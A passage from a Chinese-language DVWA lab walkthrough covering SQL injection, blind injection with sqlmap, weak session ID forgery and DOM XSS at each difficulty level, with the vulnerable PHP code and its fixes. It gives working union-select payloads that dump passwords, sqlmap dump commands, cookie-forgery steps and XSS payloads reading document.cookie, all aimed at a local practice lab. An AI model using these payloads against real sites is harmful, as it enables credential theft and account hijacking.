<p>这一关添加了token反正了CSRF，同时添加了要求用户填写当前密码的功能，也防止了SQL注入，接着判断验证码是否匹配。</p>
<p>很明显这里修改了前几个级别犯的错误，我们已经没有办法通过增删参数来绕过了。</p>
<h1>0x07 SQL Injection</h1>
<h2 id="Low-7">Low</h2>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112180252324.png" alt="image-20240112180252324"></p>
<p>如上图所示，这里显示判断数据库类型（并不需要在意），随后对用户输入的id参数进行拼接SQL语句查询，然后直接连接数据库查询对应id的数据，并未做出任何过滤，我们只需要正确闭合SQL语句即可</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">?id=1' union select <span class="token function">version</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>--+&amp;Submit=Submit#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112180512510.png" alt="image-20240112180512510"></p>
<p>由于代码本身就支持展示多行数据，也就没必要搞什么分隔符之类的来明晰数据了</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112181713231.png" alt="image-20240112181713231"></p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">?id=1' union select user<span class="token punctuation">,</span> password <span class="token keyword">from</span> users--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="Medium-7">Medium</h2>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112180632235.png" alt="image-20240112180632235"></p>
<p>修改的点在于采用<code>mysqli_real_escape_string</code>函数来对特殊字符进行转义，其中特殊字符如下图所展示</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112180624680.png" alt="image-20240112180624680"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112180750061.png" alt="image-20240112180750061"></p>
<p>但这里幸运的是，改为了数字型查询。但这里有限制的点在于，当我们查到表名为users，接来下回去查询users中的列名，那无疑是需要单引号或者双引号包围的，但我们可以通过16进制绕过，因为SQL数据库对16进制数据会自动转换为10进制识别</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112181915754.png" alt="image-20240112181915754"></p>
<h2 id="High-7">High</h2>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112184636745.png" alt="image-20240112184636745"></p>
<p>这一级别与第一关类似，只不过id的位置在session，并不在页面当中了</p>
<p>我们在input输入框中输入：<code>?id=-1' union select user, password from users--+</code>即可</p>
<h2 id="Impossible-7">Impossible</h2>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112185242167.png" alt="image-20240112185242167"></p>
<p>这里多了一个token的验证，同时判断用户输入的id是否为数字类型，如果不是直接无效，如果是的话，强制转换为整数类型，接着采用PDO预编译，导致我们无法进行SQL语句的闭合</p>
<p>prepare 预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。</p>
<h1>0x08 SQL Injection (Blind)</h1>
<h2 id="Low-8">Low</h2>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112185654418.png" alt="image-20240112185654418"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112185716349.png" alt="image-20240112185716349"></p>
<p>上述两处代码结合会发现，即使我们查询成功，也只会显示是否成功的消息展示，并不会将数据显示出来，这意味着我们只能进行盲注了</p>
<p>同时这与SQL注入类似，并不没有做出任何过滤</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">python3 sqlmap.py -u <span class="token string">"http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1*&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low; PHPSESSID=cp58onvdgg0k61kihafkofof9j"</span> --current-db<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112192426242.png" alt="image-20240112192426242"></p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">python3 sqlmap.py -u <span class="token string">"http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1*&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low; PHPSESSID=cp58onvdgg0k61kihafkofof9j"</span> -D dvwa --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112192455049.png" alt="image-20240112192455049"></p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">python3 sqlmap.py -u <span class="token string">"http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1*&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low; PHPSESSID=cp58onvdgg0k61kihafkofof9j"</span> -D dvwa -T users --dump --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112192607692.png" alt="image-20240112192607692"></p>
<h2 id="Medium-8">Medium</h2>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112192717645.png" alt="image-20240112192717645"></p>
<p>依旧是盲注，虽然这里对id参数做了特殊字符转移，但类似0x07的 SQL注入，我们依旧是可以绕过的，比如16进制。</p>
<p>交给sqlmap完全可以</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">python3 sqlmap.py -u <span class="token string">"http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1*&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=medium; PHPSESSID=cp58onvdgg0k61kihafkofof9j"</span> -D dvwa -T users --dump --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112192830472.png" alt="image-20240112192830472"></p>
<h2 id="High-8">High</h2>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112192858971.png" alt="image-20240112192858971"></p>
<p>不同点在于id的位置换成了cookie，但仍然没有做出有效的限制，依旧可以sqlmap</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">python3 sqlmap.py -u <span class="token string">"http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/"</span> --cookie <span class="token string">"id=1*; security=high; PHPSESSID=cp58onvdgg0k61kihafkofof9j"</span> -D dvwa -T users --dump --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112200305536.png" alt="image-20240112200305536"></p>
<h2 id="Impossible-8">Impossible</h2>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112200425482.png" alt="image-20240112200425482"></p>
<p>这一等级同样采用了PDO的SQL预编译、防止CSRF，检查id是否为数字型。</p>
<h1>0x09 Weak Session IDs</h1>
<p>一种通过窃取用户SessionID，使用该SessionID登录进目标账户的攻击方法，此时攻击者实际上是使用了目标账户的有效Session。如果SessionID是保存在Cookie中的，则这种攻击可以称为Cookie劫持。</p>
<p>SessionID还可以保存在URL中，作为一个请求的一个参数，但是这种方式的安全性难以经受考验。</p>
<h2 id="Low-9">Low</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$html</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"POST"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'last_session_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'last_session_id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'last_session_id'</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token variable">$cookie_value</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'last_session_id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"dvwaSession"</span><span class="token punctuation">,</span> <span class="token variable">$cookie_value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里的代码逻辑是，只要post方法请求一次，就会令session_id++，当然如果不存在的话，置零。</p>
<p>这很容易让攻击者伪造cookie，我们这里bp抓包一次发现如下</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112201226875.png" alt="image-20240112201226875"></p>
<p>当我们将这个cookie复制下来，然后换一个浏览器访问该weak_session_id对应的url，会发现不需要登录直接就到达指定url页面</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112201210123.png" alt="image-20240112201210123"></p>
<h2 id="Medium-9">Medium</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$html</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"POST"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$cookie_value</span> <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"dvwaSession"</span><span class="token punctuation">,</span> <span class="token variable">$cookie_value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里是采用时间戳作为session会话，但是这里时间戳也是有规律可循的，是可以伪造的。我们采用时间戳转换工具：</p>
<p><a target="_blank" rel="noopener" href="https://tool.lu/timestamp/">https://tool.lu/timestamp/</a></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112201820692.png" alt="image-20240112201820692"></p>
<p>这里我们可以选一个未来的时间，并转换为时间戳，接着我们可以诱骗用户在这一时间点击这一关的generate按钮</p>
<p>当其点击过之后，我们便可以成功进行伪造了</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112201810896.png" alt="image-20240112201810896"></p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">Cookie</span><span class="token punctuation">:</span> dvwaSession=1705061825<span class="token punctuation">;</span> security_level=0<span class="token punctuation">;</span> ajs_anonymous_id=f11e1270-bf66-42b5-b337-91c6d4d5ff4f<span class="token punctuation">;</span> ajs_user_id=048546bfc1e19205a55a5993547bc9308acf5a9c<span class="token punctuation">;</span> ocKey=512389862aecb2132976ffe9960380f4<span class="token punctuation">;</span> PHPSESSID=mc4bn9ou74faqboqg56aag47t0<span class="token punctuation">;</span> security=medium<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>将我们准备的时间戳伪造成cookie，接着换一个其他浏览器发送，即可绕过登录</p>
<h2 id="High-9">High</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$html</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"POST"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'last_session_id_high'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'last_session_id_high'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'last_session_id_high'</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token variable">$cookie_value</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'last_session_id_high'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"dvwaSession"</span><span class="token punctuation">,</span> <span class="token variable">$cookie_value</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/vulnerabilities/weak_id/"</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_HOST'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里与第一个low级别类似，不过这里的session经过了md5加密。我们bp抓包的时候可以很容易看出来md5的迹象的，经过一个解密即可知道是由数字0开始++之后得到的整数的md5加密值，依旧很容易构造</p>
<h2 id="Impossible-9">Impossible</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$html</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"POST"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$cookie_value</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"Impossible"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"dvwaSession"</span><span class="token punctuation">,</span> <span class="token variable">$cookie_value</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/vulnerabilities/weak_id/"</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_HOST'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里设置了随机数，然后拼接当前时间戳和impossible，最后经过sha1加密，如果我们不能得到随机数种子，以及后面的<code>Impossible</code>字符，是根本无法构造的。</p>
<p>这只是代码审计的前提下才知道其构造原理，如果单纯抓包等等，基本不可能判断出来其session产生原理。</p>
<h1>0x10 XSS(DOM)</h1>
<h2 id="Low-10">Low</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment"># No protections, anything goes</span>

<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>无任何保护。。。。</p>
<p>我们看一下页面关于此处的html源码</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>vulnerable_code_area<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>

         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>Please choose a language:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>

        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>XSS<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>default<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"default="</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">var</span> lang <span class="token operator">=</span> document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"default="</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;option value='"</span> <span class="token operator">+</span> lang <span class="token operator">+</span> <span class="token string">"'&gt;"</span> <span class="token operator">+</span> <span class="token function">$decodeURI</span><span class="token punctuation">(</span>lang<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&lt;/option&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;option value='' disabled='disabled'&gt;----&lt;/option&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>

                    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;option value='English'&gt;English&lt;/option&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;option value='French'&gt;French&lt;/option&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;option value='Spanish'&gt;Spanish&lt;/option&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;option value='German'&gt;German&lt;/option&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Select<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>很明显这里对用户的输入复制给了lang变量，接着在没有任何过滤的情况下直接进行url解码拼接到document.write函数下</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112203626229.png" alt="image-20240112203626229"></p>
<h2 id="Medium-10">Medium</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// Is there any input?</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"default"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_null</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'default'</span> <span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$default</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'default'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    
    <span class="token comment"># Do not allow script tags</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stripos</span> <span class="token punctuation">(</span><span class="token variable">$default</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;script"</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">header</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"location: ?default=English"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">exit</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里过滤了<code>&lt;script</code>标签，但我们还可以选择更多的标签来绕过</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">?default=&lt;img src=1 onerror=<span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span>&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>但毕竟我们换了标签，必须要闭合前面的标签，否则这里的img标签便不起作用了</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112204025723.png" alt="image-20240112204025723"></p>
<p>闭合option与select标签即可</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">?default=&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=<span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span>&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112204419920.png" alt="image-20240112204419920"></p>
<h2 id="High-10">High</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// Is there any input?</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"default"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_null</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'default'</span> <span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment"># White list the allowable languages</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'default'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">case</span> <span class="token string double-quoted-string">"French"</span><span class="token punctuation">:</span>
        <span class="token keyword">case</span> <span class="token string double-quoted-string">"English"</span><span class="token punctuation">:</span>
        <span class="token keyword">case</span> <span class="token string double-quoted-string">"German"</span><span class="token punctuation">:</span>
        <span class="token keyword">case</span> <span class="token string double-quoted-string">"Spanish"</span><span class="token punctuation">:</span>
            <span class="token comment"># ok</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">default</span><span class="token punctuation">:</span>
            <span class="token function">header</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"location: ?default=English"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">exit</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里说如果default的值不是上面四个指定的值中的一个，则直接无效，这里学了师傅们的两个思路</p>
<p>方法一：可以使用 <code>&amp;</code> 连接另一个自定义变量来 Bypass</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">?default=English&amp;a=&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=<span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span>&gt;

?default=English&amp;a=&lt;input onclick=<span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span> /&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112204856429.png" alt="image-20240112204856429"></p>
<p>方法二：使用<code>#</code>来 Bypass</p>
<p>注：在url中#后边的内容不会发送到服务端，从而可以实现绕过。</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">?default=English#&lt;/option&gt;&lt;/select&gt;&lt;BODY ONLOAD=<span class="token function">alert</span><span class="token punctuation">(</span>document.cookie<span class="token punctuation">)</span>&gt;
?default=English#&lt;input onclick=<span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'document.cookie'</span><span class="token punctuation">)</span> /&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112205022569.png" alt="image-20240112205022569"></p>
<h2 id="Impossible-10">Impossible</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment"># Don't need to do anything, protection handled on the client side</span>

